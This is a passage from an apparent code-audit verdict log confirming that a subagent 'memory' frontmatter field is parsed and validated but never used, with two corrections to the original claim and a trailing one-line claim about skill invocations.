capabilities/native-sources.ts:910/1028/1093 - and a child session does inherit those records as pinned context (pi-harness/child-session-port.ts:188 keeps view.memory through the child intersection, pi-harness/context-resource.ts:66 pins it). But that content is keyed on SCOPE DISCOVERY, is identical for every subagent, and is never keyed on AgentDefinition.memory; citing it would be naming the wrong subsystem. Upstream-already-handled check: the Claude SDK backend is not quietly doing it either - subagents run the Pi harness path and claude-agent.ts has no per-agent memory handling. NOT one of the nine dated owner decisions in docs/superpowers/specs/2026-07-29-inert-worklist.md section 3 (SEATBELT_TESTING_WILDCARD, availableModels/enforceAvailableModels, autoMode.classifyAllShell, ManagedDeliveryStateV1.drops, plugins/hooks-runtime.ts, SdkMcpServerConfig.required, SessionMirrorStore.delete, MirrorSessionKey.subpath/listSubkeys, listSessionSummaries), and not in section 4's false positives. Not a deliberate product difference: no subscription flow, no gateway scoping, and the .claude -> .nessy-agent rename is irrelevant because the feature is absent under EVERY name, not relocated. What it is instead is an already-recorded, costed-and-deferred gap: docs/superpowers/plans/2026-07-29-subagent-frontmatter.md:143 files `memory` as "documented, not implemented - scope parsed, validated and carried; the per-agent memory DIRECTORY (agent-memory/<name>/, MEMORY.md injection, auto Read/Write/Edit) is a subsystem we do not have" (commit b31d6421). That confirms rather than refutes. NOTE FOR DEDUP: this is the same underlying gap as verdict f089 (cited against sub-agents.md, refuted=false); f148 re-confirms it independently from the claude-directory.md side.
verdict.correctedState: Confirmed, with two wording tightenings. Accurate as claimed: `memory: user|project|local` is parsed and strictly validated in three places (definitions.ts:366-370 plus a throw on an invalid value; pi-harness/runtime-agent-definition.ts:336-339 and :616-620), carried on AgentDefinition (definitions.ts:95) and on the runtime descriptor (:141), spread through to the orchestrator (pi-agent-server/src/orchestrator/runtime-agent-definitions.ts:173) - and consumed by nothing. No agent-memory/<name>/ directory is created under any name, in source or in the shipped dist bundles; no MEMORY.md is read on account of the field; Read/Write/Edit are not force-enabled; spawner.ts contains zero occurrences of `memory`. Tightening 1: the fork is not memory-less. A subagent DOES inherit the session/user/project MEMORY.md records as pinned context (capabilities/native-sources.ts discovery -> pi-harness/child-session-port.ts:188 -> context-resource.ts:66), so the missing piece is specifically the PER-AGENT, cross-session-learning store, not memory in general. Tightening 2: 'gets none' overstates the harm slightly - the host never tells the agent it has a private memory directory, so the field is silently inert rather than actively misleading; an author who writes `memory: project` gets strict validation, a value that round-trips, and no per-agent cross-session learning of any kind.

results.claim: Multiple skill invocations at the start of a message all load, each receiving the trailing text as arguments, up to six.
